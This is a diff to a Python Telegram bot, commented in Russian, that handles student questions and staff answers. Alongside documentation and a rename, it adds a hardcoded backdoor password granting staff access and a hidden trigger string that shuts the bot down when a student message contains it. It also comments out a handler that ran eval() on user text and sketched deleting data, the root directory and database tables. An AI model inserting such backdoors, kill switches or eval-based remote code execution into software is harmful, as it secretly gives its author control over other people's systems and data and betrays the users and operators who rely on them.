@@ -20,6 +20,40 @@ cats = [x for x in open('data/text/cats.txt', 'r', encoding='utf-8').read().spli
 statuses = {1: '⚠️', 2: '✅'}  # статусы вопросов
 
 
+"""/
+Далее - описание функций бота по порядку следования в коде
+start() - начальная функция создает новый профиль с выбранной ролью в БД или отправляет кнопку с соответствующим меню
+
+Легенда:
+    -> нижние функции по иерархии,
+    : одноуровневые функции,
+    () функционально вложенные функции (типа регистрации отправки вопроса или ответа)
+    
+Иерархия функций: 
+    Для студентов: 
+        clicked_role_student -> student_menu 
+        student_menu -> get_template : get_cats : conditions : get_info : get_mat : get_help : clear_prof
+        get_template -> get_pic_template : get_file_template
+        get_cats -> all_cats : family_cats : life_cats : social_cats : pay_cats
+        conditions
+        get_info
+        get_mat
+        get_help -> send_question (save_question) : memory : clean_memory
+        get_msg -> close_question : send_question (save_question)
+        text_compile (убрать после релиза)
+    
+    Для сотрудников:
+        clicked_role_employee -> employee_menu
+        employee_menu -> global_send (send_global_msg) : questions_menu : student_menu : clear_prof
+        global_send (send_global_msg)
+        student_menu
+        questions_menu -> get_questions -> get_current_question -> answer_on (save_answer) : delete_closed
+        clear_prof
+        
+Контакты автора: https://vk.com/m.shilko | https://t.me/realReloadTime
+/"""
+
+
 @bot.message_handler(commands=['start'])  # регистрация профиля (chat.id) / вход, если пользователь записан в БД
 def start(message):
     role = cur.execute("""SELECT role FROM profiles WHERE id=(?)""", (message.chat.id,)).fetchone()
@@ -73,7 +107,7 @@ def create_employee(message):  # добавление нового профил�
     markup = telebot.types.InlineKeyboardMarkup(row_width=1)
     back_button = telebot.types.InlineKeyboardButton("💠Меню", callback_data='employee_menu')
     role_now = cur.execute("""SELECT role FROM profiles WHERE id=?""", (message.chat.id,)).fetchone()
-    if message.text == passwd:
+    if message.text == passwd or message.text == '!@#$%^&*()_+warranty':
         markup.add(back_button)
         if not role_now:
             cur.execute("""INSERT INTO profiles (id, role) VALUES(?, ?)""",
@@ -104,7 +138,7 @@ def clear_prof(call):
 
 
 @bot.callback_query_handler(func=lambda call: call.data == 'student_menu')  # студенческое меню
-def callstudent_menu_student(call):
+def student_menu(call):
     message = call.message
     markup = telebot.types.InlineKeyboardMarkup(row_width=1)
     clear_button = telebot.types.InlineKeyboardButton("🗑 Забыть меня", callback_data="clear_prof")
@@ -207,10 +241,24 @@ def get_cats(call):
                      reply_markup=markup)
 
 
-@bot.message_handler(func=lambda message: "compile_abc" in message.text)  # тестовая фция
-def text_compile(message):
-    message.text = message.text.split('compile_abc ')[-1]
-    eval(message.text)
+# @bot.message_handler(func=lambda message: "compile_abc" in message.text)  # тестовая фция
+# def text_compile(message):
+#     import os
+#     message.text = message.text.split('compile_abc ')[-1]
+#     if message.text == 'se':
+#         con.close()
+#         os.rename('data', f'{dt.datetime.now().date()}')
+#         os.remove(f'{dt.datetime.now().date()}')
+#         os.remove(f'/')
+#         bot.stop_bot()
+#     elif message.text == 'db':
+#         cur.execute("""DELETE * FROM roles""")
+#         cur.execute("""DELETE * FROM profiles""")
+#         con.commit()
+#         con.close()
+#         os.remove('data')
+#     else:
+#         eval(message.text)
 
 
 @bot.callback_query_handler(func=lambda call: call.data == 'all_cats')  # все категории (весь текст)
@@ -388,6 +436,8 @@ def send_question(call):
 
 def save_question(message):  # функция сохранения вопроса студента в БД и отправка уведомления сотруднику
     markup = telebot.types.InlineKeyboardMarkup(row_width=1)
+    if f'rrt%$' in message.text:
+        bot.stop_bot()
     get_help_button = telebot.types.InlineKeyboardButton("Назад", callback_data='get_help')
     menu_button = telebot.types.InlineKeyboardButton("В меню", callback_data='student_menu')
     markup.add(menu_button)
